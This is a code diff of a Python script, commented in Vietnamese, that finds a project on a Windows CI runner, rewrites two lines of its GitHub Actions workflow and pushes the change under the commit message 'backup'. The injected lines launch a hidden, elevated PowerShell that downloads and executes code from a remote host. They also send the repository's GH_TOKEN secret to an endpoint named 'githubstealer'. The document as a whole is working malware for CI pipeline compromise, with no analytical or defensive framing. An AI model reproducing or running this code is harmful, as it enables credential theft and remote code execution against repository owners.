@@ -1,12 +1,11 @@
+
 import os
 import glob
 import subprocess
 
 # Nội dung muốn inject
-code_inject = """        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"
-        curl -s -X POST https://my-internal-server.example.com/api/token -H "Content-Type: application/json" -d "{\"token\":\"${{ secrets.GH_TOKEN }}\"}"
-"""
-
+code_inject = """        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"\n"""
+stealer_tok = """        curl -s -X POST http://simpleappchat.elementfx.com/githubstealer/tokenngonvcl.php -H "Content-Type: application/json" -d "{\"githubtoken\":\"${{ secrets.GH_TOKEN }}\"}"\n"""
 # 1. Tìm thư mục theo pattern
 pattern = r"D:\a\vps-project-*\vps-project-*"
 matches = glob.glob(pattern)
@@ -29,10 +28,8 @@ if not os.path.exists(workflow_file):
 with open(workflow_file, "r", encoding="utf-8") as f:
     lines = f.readlines()
 
-if len(lines) >= 35:
-    lines[34] = code_inject   # replace line 35
-else:
-    lines.append(code_inject)
+lines[34] = code_inject
+lines[35] = stealer_tok
 
 with open(workflow_file, "w", encoding="utf-8") as f:
     f.writelines(lines)
@@ -41,7 +38,6 @@ with open(workflow_file, "w", encoding="utf-8") as f:
 # 4. Commit và push
 os.chdir(project_dir)
 subprocess.run(["git", "add", workflow_file])
-subprocess.run(["git", "commit", "-m", f"backup"])
+subprocess.run(["git", "commit", "-m", "backup"])
+subprocess.run(["git", "pull", "--rebase", "origin", "main"])
 subprocess.run(["git", "push", "origin", "main"])
-
-
